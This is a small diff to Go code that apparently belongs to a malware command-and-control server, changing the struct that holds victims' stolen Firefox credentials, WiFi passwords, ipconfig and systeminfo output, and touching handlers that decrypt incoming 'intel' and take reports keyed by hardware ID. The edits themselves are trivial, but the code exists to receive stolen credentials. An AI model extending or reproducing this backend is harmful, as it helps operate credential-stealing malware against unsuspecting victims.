@@ -14,7 +14,7 @@ import (
 
 type Record struct {
 	FirefoxCredentials string `json:"firefox"`
-	WiFiPasswords string `json:"wifi"`
+	WiFiPasswords []string `json:"wifi"`
 	IPConfigOutput string `json:"ipconfig"`
 	SystemInfoOutput string `json:"systeminfo"`
 }
@@ -80,7 +80,6 @@ func DecodeIntel(encoded string) string{
 	if err := json.Unmarshal([]byte(decrypted), &dat); err != nil {
 		LogError(err)
 	}
-	
 	return decrypted
 }
 
@@ -100,7 +99,6 @@ func GetConfiguration(ctx *fasthttp.RequestCtx){
 }
 
 func PassTheBag(ctx *fasthttp.RequestCtx){
-
 	hwid := ctx.UserValue("hwid").(string)
 	log.Println("The coming hwid is ->", hwid)
 	heartbeat := string(ctx.Request.Body())
